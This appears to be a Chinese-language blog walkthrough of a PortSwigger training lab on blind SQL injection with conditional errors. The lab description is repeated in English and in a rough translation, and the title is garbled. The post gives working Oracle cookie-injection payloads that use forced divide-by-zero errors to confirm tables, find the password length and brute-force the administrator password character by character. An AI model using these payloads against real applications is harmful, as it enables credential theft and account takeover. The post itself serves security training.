---
layout: post
title: "Blind SQL Blind SQL injection with conditional errorswith conditional errors"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# Blind SQL Blind SQL injection with conditional errorswith conditional errors


```


This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### Hint

This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).





本實驗室包含一個 [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) 漏洞。 該應用程序使用跟踪 cookie 進行分析，並執行包含提交的 cookie 值的 SQL 查詢。

不會返回 SQL 查詢的結果，並且應用程序不會根據查詢是否返回任何行而做出任何不同的響應。 如果 SQL 查詢導致錯誤，則應用程序會返回自定義錯誤消息。

該數據庫包含一個名為“users”的不同表，其中包含名為“username”和“password”的列。 您需要利用盲注[SQL注入](https://portswigger.net/web-security/sql-injection)漏洞找出`administrator`用戶的密碼。

要解決實驗室問題，請以“管理員”用戶身份登錄。

＃＃＃＃ 暗示

本實驗室使用 Oracle 數據庫。 有關詳細信息，請參閱 [SQL 注入備忘單](https://portswigger.net/web-security/sql-injection/cheat-sheet)。



```





MYSQL
```

select '1' ; 

select '1' ';
//語句後面沒有閉合報錯。

select '1' '';
//語句後面閉合正確。


```


這題類似，使用報錯注入


```
TrackingId=xyz'
// 500 Internal Server Error

TrackingId=xyz''
//200 OK

```

|| 是ORACLE 的拼接
```
xyz' || (select '') ||' 


(select '') = 空值

所以最後還是會變成
xyz''
//200 OK

但結果居然是
500 Internal Server Error

這裡有個坑。(ORACLE select 必須用  FROM 關鍵字)
xyz' || (select '' from dual) ||'
//200 OK

```


測users表是否存在。
存在就不會報錯。
```
xyz' ||(select '' from users where rownum =1)|| '
//200 OK


xyz' ||(select '' from users12345689 where rownum =1)|| '
// 500 Internal Server Error

```


1.只要 when 條件式= TRUE  就執行 then 
2  to_char(1/0)  會出現錯誤(具體原因有帶查詢，這邊只要知道會有錯誤就可)
3.
```
xyz' ||(select case when (1=1) then to_char(1/0) else '' end from dual)||'

```

結論 我們想要的判斷的資料就故意報錯。


判断顺序是先判断where后面的内容。
1 .  from users where username='administrator' 成立，找的到為1。
 然後走到，when (1=1)  then to_char(1/0) 故意報錯

2 . from users where username='administrator111' 不成立，找不到為0，
走到 ELSE ' ' 


```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
// echo 500 




TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator111')||'
//echo 200



```


1.FROM users WHERE username='administrator' 成立
2.密碼長度又大於1
就報錯。

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

測出來密碼大於 20 會 200 OK，代表密碼長度為20


到了這拿去爆破
只要是我們要的，就會報錯 500 
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'




******************************************
 SUBSTR( password, xxxxx, 1)='yyyyyy'
 xxxxx 設置 1-20
 yyyyyy 設置 a-z A-Z 0-9
******************************************




```


最後爆破出密碼，登入吧。

